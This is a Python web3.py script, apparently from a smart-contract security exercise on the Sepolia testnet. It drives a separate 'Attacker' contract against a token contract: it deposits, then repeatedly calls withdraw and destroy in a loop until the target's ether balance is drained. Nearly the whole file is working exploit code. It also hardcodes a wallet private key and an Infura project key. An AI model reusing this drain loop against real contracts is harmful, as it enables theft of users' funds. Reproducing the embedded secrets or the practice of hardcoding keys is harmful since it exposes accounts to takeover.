from solcx import compile_source
from web3 import Web3, Account

w3 = Web3(Web3.HTTPProvider(
    'https://sepolia.infura.io/v3/23a668257ecb4ece82ff765e85972ef7'))
assert w3.is_connected(), "Web3 is not connected to the Ethereum network!"
private_key = "0xd0d87fa4b6f9758dd2151efa78671331f206e3327e44eb69837b547c8e62c320"
account = Account.from_key(private_key)
print(account.address)
w3.eth.default_account = account.address

with open("./03_ERC20.sol") as f:
    source_code = f.read()
compile_sol = compile_source(source_code)
contract_interface = compile_sol['<stdin>:TestToken']
original_address = "0x7B54F625F8dF5646D4E75B6A44105C46C88CED65"
contract = w3.eth.contract(
    address=original_address,
    abi=contract_interface['abi']
)
print(f"Current balance: {w3.eth.get_balance(original_address)}")

with open("./Attacker.sol") as f:
    attacker_source_code = f.read()
# attacker_source_code.replace("0x7B54F625F8dF5646D4E75B6A44105C46C88CED65", original_address)
compiled_sol = compile_source(attacker_source_code)
attacker_contract_interface = compiled_sol['<stdin>:Attacker']

attacker_contract_address = "0xd9145CCE52D386f254917e481eB44e9943F39138"
attacker_contract = w3.eth.contract(
    address=attacker_contract_address,
    abi=attacker_contract_interface['abi']
)


def call_function(function, *arg, gas_limit=200000, value=0):
    nonce = w3.eth.get_transaction_count(account.address)
    txn = function(*arg).build_transaction({
        'from': account.address,
        'gas': gas_limit,
        'gasPrice': w3.eth.gas_price,
        'nonce': nonce,
        'value': value
    })
    signed_txn = Account.sign_transaction(txn, private_key)
    txn_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
    txn_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)
    print(txn_receipt)


call_function(attacker_contract.functions.deposit, value=3000000000)
while w3.eth.get_balance(original_address) > 5000000000000000:
    print(f"Current balance: {w3.eth.get_balance(original_address)}")
    print(f"Account Balance: {w3.eth.get_balance(account.address)}")
    call_function(attacker_contract.functions.withdraw,
                  gas_limit=4000000, value=2999999997)
    call_function(attacker_contract.functions.destroy)
